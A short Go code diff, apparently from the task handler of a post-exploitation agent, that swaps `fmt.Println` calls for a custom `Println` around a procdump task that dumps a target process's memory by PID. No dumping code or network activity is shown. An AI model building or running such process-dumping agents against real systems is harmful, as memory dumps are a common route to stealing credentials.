@@ -6,7 +6,6 @@ package main
 import "C"
 
 import (
-	"fmt"
 	"strconv"
 )
 
@@ -33,24 +32,24 @@ func TaskHandler(task *Task) (stdout []byte, err error) {
 
 	pid, err := strconv.Atoi(task.Pid)
 	if err != nil {
-		fmt.Println("Error Occured with pid --> ", err.Error())
+		Println("Error Occured with pid --> ", err.Error())
 		task.status = "failed"
 		return nil, err
 	}
-	fmt.Println("Procdump started")
+	Println("Procdump started")
 	switch task.Method {
 	case "native":
 		stdout, err = procdump_native(pid)
 		if err != nil && err.Error() != "The operation completed successfully." {
-			fmt.Println("Error Occured --> ", err.Error())
+			Println("Error Occured --> ", err.Error())
 			task.status = "failed"
 			return nil, err
 		}
 	default:
 		stdoutProc, err := dumpProcess(int32(pid))
-		fmt.Println("Procdump completed")
+		Println("Procdump completed")
 		if err != nil {
-			fmt.Println("Error Occured --> ", err.Error())
+			Println("Error Occured --> ", err.Error())
 			task.status = "failed"
 			return nil, err
 		}
